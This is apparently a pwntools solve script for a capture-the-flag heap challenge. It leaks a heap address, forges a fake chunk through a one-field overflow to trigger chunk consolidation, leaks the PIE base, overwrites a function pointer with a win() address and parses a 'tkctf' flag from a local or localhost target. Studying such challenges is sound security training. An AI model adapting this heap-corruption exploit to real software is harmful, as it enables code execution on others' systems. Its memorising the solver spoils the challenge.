#!/usr/bin/env python3

import os
import re
import sys
import subprocess
from pwn import *

context.arch = "x86_64"
context.log_level = 'info'

ROOT = os.path.abspath(os.path.dirname(__file__))
bin_path = os.path.join(ROOT, "../docker/target")

# Detect if binary is 32-bit or 64-bit using readelf for reliability
def detect_arch(binary_path):
    try:
        result = subprocess.run(['readelf', '-h', binary_path],
                              capture_output=True, text=True, check=True)
        if 'ELF32' in result.stdout:
            return 32
        elif 'ELF64' in result.stdout:
            return 64
    except:
        # Fallback to pwntools detection
        elf = ELF(binary_path, checksec=False)
        return elf.bits
    return 64  # Default to 64-bit if detection fails

arch_bits = detect_arch(bin_path)
is_32bit = (arch_bits == 32)
if is_32bit:
    context.arch = "i386"
    log.info("Detected 32-bit binary")
else:
    log.info("Detected 64-bit binary")

def manifest(p, zone):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'(0-9): ', str(zone).encode())

def inscribe(p, zone, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'(0-9): ', str(zone).encode())
    p.sendlineafter(b'max 128 bytes): ', data)

def view(p, zone):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'(0-9): ', str(zone).encode())
    return p.recvuntil(b'> ', drop=True)

def corrupt(p, zone):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'(0-9): ', str(zone).encode())

def liberate(p, zone):
    p.sendlineafter(b'> ', b'5')
    p.sendlineafter(b'(0-9): ', str(zone).encode())

def execute_timeline(p):
    p.sendlineafter(b'> ', b'6')

def exploit(p):
    elf = ELF(bin_path, checksec=False)
    win_addr = elf.symbols['win']

    # Use the reliable architecture detection instead of elf.bits
    arch_bits = detect_arch(bin_path)
    is_32bit = (arch_bits == 32)

    # Set pointer packing function based on architecture
    pack_ptr = p32 if is_32bit else p64
    ptr_size = 4 if is_32bit else 8

    log.info("Manifesting all zones")
    for i in range(10):
        manifest(p, i)

    log.info("Leaking heap address")
    output = view(p, 3)
    try:
        heap_leak = int(output.split(b'0x')[1].split(b']')[0], 16)
        log.success(f"Heap leak: {hex(heap_leak)}")
        zone_3_addr = heap_leak
    except:
        log.error("Failed to parse heap leak")
        log.info(output.decode('latin-1', errors='ignore'))
        return None

    log.info("Crafting fake chunk in Zone 3")

    # Calculate offsets using USER DATA sizes (not chunk sizes!)
    # Chunks are contiguous: zone_N_user_data directly follows zone_(N-1)_user_data
    # For 32-bit: malloc(0x100) -> 0x100 user, malloc(0x180) -> 0x180 user
    # For 64-bit: malloc(0x100) -> 0x100 user, malloc(0x180) -> 0x180 user
    if is_32bit:
        zone_3_size = 0x180  # User data size
        zone_4_size = 0x100
        zone_5_size = 0x100
        fake_size = 0x109  # Size with PREV_IN_USE flag
    else:
        zone_3_size = 0x180
        zone_4_size = 0x100
        zone_5_size = 0x100
        fake_size = 0x111

    zone_6_addr = zone_3_addr + zone_3_size + zone_4_size + zone_5_size
    log.info(f"Zone 6 estimated at: {hex(zone_6_addr)}")

    # Fake chunk is written to z->data which starts at offset 18 from zone_3_addr
    # Zone struct: number(1) + twin(1) + name(16) + data(0x80)
    fake_chunk_offset = 18
    fake_chunk_addr = zone_3_addr + fake_chunk_offset
    prev_size_value = zone_6_addr - fake_chunk_addr

    log.info(f"Fake chunk at: {hex(fake_chunk_addr)}")
    log.info(f"Prev_size value: {hex(prev_size_value)}")

    # NOTE: C code uses strlen() which stops at null bytes, limiting what we can send
    # For 32-bit: p32(0x109) = b'\x09\x01\x00\x00' has nulls at offset 2
    # This means we can only reliably send a few bytes before hitting a null
    #
    # Strategy: Send non-null data first, enable overflow, then send the real payload

    log.info("Writing initial padding to Zone 3")
    # Just write some non-null padding
    padding = b'A' * 0x80
    inscribe(p, 3, padding)

    log.info("Enabling corruption on Zone 3")
    corrupt(p, 3)

    log.info("Attempting overflow to write metadata")

    # The overflow allows 0x88 bytes. Build payload with metadata.
    # Even with null byte limitations, we can at least get some data in
    payload = b'B' * 0x80  # Fill data field

    # Try to write prev_size bytes in overflow region
    # For 32-bit, prev_size_value is like 0x368, which is b'\x68\x03\x00\x00'
    # We can send 2 bytes before hitting null: b'\x68\x03'
    # For 64-bit we'd have more non-null bytes typically

    # Append as many non-null bytes of prev_size as possible
    prev_bytes = pack_ptr(prev_size_value)
    # Find first null byte
    null_pos = prev_bytes.find(b'\x00')
    if null_pos == -1:
        prev_bytes_safe = prev_bytes[:(ptr_size-1)]
    else:
        prev_bytes_safe = prev_bytes[:null_pos] if null_pos > 0 else b'\x01'

    payload += prev_bytes_safe
    log.info(f"Sending {len(payload)} bytes ({len(prev_bytes_safe)} overflow bytes)")

    inscribe(p, 3, payload)

    log.info("Liberating Zone 6")
    liberate(p, 6)

    log.info("Getting PIE base")
    output = view(p, 9)
    try:
        exec_ptr = int(output.split(b'Execute ptr: 0x')[1].split(b']')[0], 16)
        log.success(f"Execute ptr: {hex(exec_ptr)}")

        elf_base = exec_ptr - elf.symbols['safe_exit']
        win_addr_full = elf_base + win_addr
        log.success(f"PIE base: {hex(elf_base)}")
        log.success(f"win() at: {hex(win_addr_full)}")
    except:
        log.warning("Could not leak PIE base, using relative address")
        win_addr_full = win_addr

    log.info("Attempting to overwrite function pointer")

    payload = pack_ptr(win_addr_full)
    inscribe(p, 7, payload)

    log.info("Executing timeline")
    execute_timeline(p)

    return p.recvall(timeout=2)

def parse_flag(out):
    m = re.search(b"(tkctf{[^}]+})", out)
    if m is None:
        return None
    return m.group(0).decode()

if __name__ == '__main__':
    if "REMOTE" in os.environ:
        if not "PORT" in os.environ:
            print("[!] Please specify the port number")
            exit(1)
        p = remote("localhost", int(os.environ["PORT"]))
    else:
        p = process(bin_path)

    output = exploit(p)
    if output:
        flag = parse_flag(output)
        if flag:
            print(f"Found: {flag}")
            print("OK!")
            exit(0)

    print("FAILED!")
    exit(1)

